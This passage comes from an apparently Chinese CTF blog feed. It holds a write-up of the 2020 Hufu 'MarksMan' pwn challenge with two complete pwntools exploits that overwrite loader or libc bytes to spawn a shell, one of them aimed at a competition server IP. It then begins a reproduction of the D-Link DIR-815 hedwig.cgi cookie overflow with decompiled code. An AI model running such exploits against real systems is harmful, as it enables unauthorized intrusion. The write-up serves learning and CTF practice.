punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">56</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="MarksMan"><a href="#MarksMan" class="headerlink" title="MarksMan"></a>MarksMan</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/3.png"></div><h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/4.png"></div><p>一开始就把libc地址给了，我们看到这里有个任意地址写三个字节的功能，我们可以利用这个条件来getshell。具体要怎么做呢？</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h3 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h3><p>我们可以随便先写一个地址，然后通过调试看看会调用什么函数，然后将可写的地址写one_gadget即可。</p><p>我们可以先尝试写free_hook，然后看看程序流。执行到dlerror_run的时候会call dl_catch_error：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/5.png"></div>我们看看对应的0x7ffff7bd1d90的指令是什么：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/6.png"></div>jump到0x7ffff7dd4038位置，他最后会执行[0x7ffff7dd4038]地址的指令，我们继续看看对应位置有什么内容：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/2020-hu-fu-xian-shang-sai-bu-fen-pwn-jie-ti/7.png"></div>这样的话思路就明了了，我们改0x7ffff7dd4038地址上后三位的值可以直接改为one_gadget的地址，那么就可以成功了。<h3 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h3><p>第一次改_rtld_global+3848到gets，之后二次输入改_rtld_global+2312(参数1)为/bin/sh,_rtld_global+3840(或者48，这个偏移懒得算了都改掉了)为system_addr</p><p>貌似dlopen函数中会call一次_rtld_global+3848，之后输入payload会作为下一次call的参数。改system addr和rdi参数为/bin/sh。（神迹啊…..）</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> syscontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./chall"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>off_puts <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>off_target <span class="token operator">=</span> <span class="token number">0x619f60</span>gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">,</span> <span class="token number">0xe569f</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"near: 0x"</span><span class="token punctuation">)</span>data <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> data<span class="token operator">-</span>off_putslibc_target <span class="token operator">=</span> libc_base <span class="token operator">+</span> off_targetone_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> gadget<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"target address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_target<span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p.sendlineafter("shoot!",str(libc_base+libc.symbols["__free_hook"]))</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"shoot!"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7dd4038</span><span class="token operator">-</span><span class="token number">0x7ffff77e0000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"biang!\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p8<span class="token punctuation">(</span>one_gadget<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"biang!\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"biang!\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token comment" spellcheck="true"># 第一次改_rtld_global+3848到gets，</span><span class="token comment" spellcheck="true"># 之后二次输入改_rtld_global+2312(参数1)</span><span class="token comment" spellcheck="true"># 为/bin/sh,_rtld_global+3840(或者48，这个偏移懒得算了都改掉了)为system_addr</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux','split','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./chall'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>ini_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2be</span><span class="token punctuation">,</span><span class="token number">0x4f31d</span><span class="token punctuation">,</span><span class="token number">0x10a2f7</span><span class="token punctuation">,</span><span class="token number">0xe5696</span><span class="token punctuation">]</span>ld <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/ld-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./chall'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.97.210.182'</span><span class="token punctuation">,</span><span class="token number">10055</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#leak libc</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"I placed the target near: 0x"</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"shoot!shoot!"</span><span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base    shell_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> gadgets<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    shell_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"shell addr => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    ld_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7ffd000</span><span class="token operator">-</span><span class="token number">0x7ffff77e0000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token number">3848</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"ld addr => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>ld_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    ld<span class="token punctuation">.</span>address <span class="token operator">=</span> ld_addr    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>ld_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"biang"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>shell_addr<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"biang"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>shell_addr<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"biang"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>shell_addr<span class="token operator">&amp;</span><span class="token number">0xffffff</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"/bin/sh\x00"</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">3840</span><span class="token operator">-</span><span class="token number">2312</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寄存器层面整数溢出 </tag>
            
            <tag> 改三个字节exit来getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器学习之D-Link DIR-815溢出漏洞复现</title>
      <link href="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/"/>
      <url>/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>用了mipsrop发现是真的香，以前做mips题全部是ropper到txt里找相关寄存器的指令，构造极其复杂，有了mipsrop发现很多可控的jmp地址。</p><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/0.png"></div><p>我们看到是在hedwig.cgi中产生的一个cookie溢出的漏洞。我们下载这个固件利用binwalk -e [file]即可获得文件系统，利用命令：</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">find</span> ./ -name <span class="token string">'hedwig.cgi'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到其对应的位置，在该文件位置处利用命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ls</span> -l hedwig.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看该文件信息</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/1.png"></div>我们看到这个文件是指向cgibin的符号链接，这个好像没什么用<h1 id="Ghidra反汇编程序分析"><a href="#Ghidra反汇编程序分析" class="headerlink" title="Ghidra反汇编程序分析"></a>Ghidra反汇编程序分析</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/2.png"></div><p>程序通过getenv函数获取数据包中cookie数据：</p><p><strong>流程大概是：<br>1主Web程序监听端口-&gt;传送HTTP数据包<br>2.HTTP中headers等数据通过环境变量的方式传给cgi处理程序<br>3.cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据<br>4.POST具体数据可以通过类似输入流传入 ：echo “uid=aaa”| /htdocs/web/hedwig.cgi</strong></p><p>定位到sess_get_uid函数</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sess_get_uid</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar3_cookie<span class="token punctuation">;</span>  undefined4 uVar3<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar4<span class="token punctuation">;</span>  uint uVar5<span class="token punctuation">;</span>  code <span class="token operator">*</span>pcVar6<span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/* malloc 0x18 heap */</span>  iVar1 <span class="token operator">=</span> <span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  pcVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  pcVar3_cookie <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_COOKIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>pcVar3_cookie <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    uVar5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>LAB_00407e28<span class="token punctuation">:</span>    iVar4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>pcVar3_cookie<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407ec4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>LAB_00407db0<span class="token punctuation">:</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        uVar5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token punctuation">{</span>        uVar5 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">!=</span> <span class="token number">0x3d</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">,</span>iVar4<span class="token punctuation">)</span><span class="token punctuation">;</span>          uVar5 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">!=</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">sobj_free</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">sobj_free</span><span class="token punctuation">(</span>pcVar2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> LAB_00407db0<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        pcVar3_cookie <span class="token operator">=</span> pcVar3_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">==</span> <span class="token number">0x3b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          uVar5 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>          <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">sobj_add_char</span><span class="token punctuation">(</span>pcVar2<span class="token punctuation">,</span>iVar4<span class="token punctuation">)</span><span class="token punctuation">;</span>        pcVar3_cookie <span class="token operator">=</span> pcVar3_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>uVar5 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        iVar4 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span>        uVar5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">goto</span> LAB_00407e24<span class="token punctuation">;</span>        <span class="token keyword">goto</span> LAB_00407e40<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>LAB_00407e24<span class="token punctuation">:</span>    pcVar3_cookie <span class="token operator">=</span> pcVar3_cookie <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> LAB_00407e28<span class="token punctuation">;</span>  <span class="token punctuation">}</span>LAB_00407ee0<span class="token punctuation">:</span>  pcVar6 <span class="token operator">=</span> getenv<span class="token punctuation">;</span>  pcVar3_cookie <span class="token operator">=</span> <span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">;</span>LAB_00407e48<span class="token punctuation">:</span>  uVar3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>pcVar6<span class="token punctuation">)</span><span class="token punctuation">(</span>pcVar3_cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sobj_add_string</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span>uVar3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">sobj_del</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>pcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">/* WARNING: Could not recover jumptable at 0x00407ebc. Too many branches */</span>                    <span class="token comment" spellcheck="true">/* WARNING: Treating indirect jump as call */</span>    <span class="token function">sobj_del</span><span class="token punctuation">(</span>pcVar2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span><span class="token punctuation">;</span>LAB_00407ec4<span class="token punctuation">:</span>  iVar4 <span class="token operator">=</span> <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span>iVar1<span class="token punctuation">,</span><span class="token operator">&amp;</span>DAT_0041a5d8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar4 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>LAB_00407e40<span class="token punctuation">:</span>    pcVar6 <span class="token operator">=</span> sobj_get_string<span class="token punctuation">;</span>    pcVar3_cookie <span class="token operator">=</span> pcVar2<span class="token punctuation">;</span>    <span class="token keyword">goto</span> LAB_00407e48<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">goto</span> LAB_00407ee0<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 